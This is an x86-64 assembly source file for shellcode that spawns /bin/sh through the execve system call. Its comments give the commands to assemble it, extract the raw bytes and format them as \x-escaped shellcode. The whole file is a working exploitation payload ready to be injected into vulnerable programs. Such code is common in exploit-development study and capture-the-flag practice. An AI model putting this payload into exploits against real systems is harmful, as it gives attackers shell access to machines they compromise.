/* execve("/bin/sh", ["/bin/sh", NULL], NULL) */
.section .text
.global _start

// assembler + linker 
// as --64 -o execve_x64.o execve_bin_sh.s && ld -o execve_x64 execve_x64.o

// Print shellcode format \xef\xbe\xad\xde..
// objcopy -O binary --only-section=.text execve_x64 execve_x64.bin
// xxd -p -c 256 execve_x64.bin | sed 's/\(..\)/\\x\1/g'

// shellcode size
// wc -c execve_x64.bin

_start:
    xorq    %rax, %rax
    movabsq $0x68732f6e69622f, %rbx   # "/bin/sh"
    pushq   %rbx
    movq    %rsp, %rdi                # rdi = ptr "/bin/sh"
    pushq   %rax                      # argv[1] = NULL
    pushq   %rdi                      # argv[0] = ptr "/bin/sh"
    movq    %rsp, %rsi                # rsi = argv
    xorq    %rdx, %rdx                # rdx = envp = NULL
    movb    $59, %al                  # syscall execve (59)
    syscall

    /* exit fallback */
    movb    $60, %al
    xorq    %rdi, %rdi
    syscall
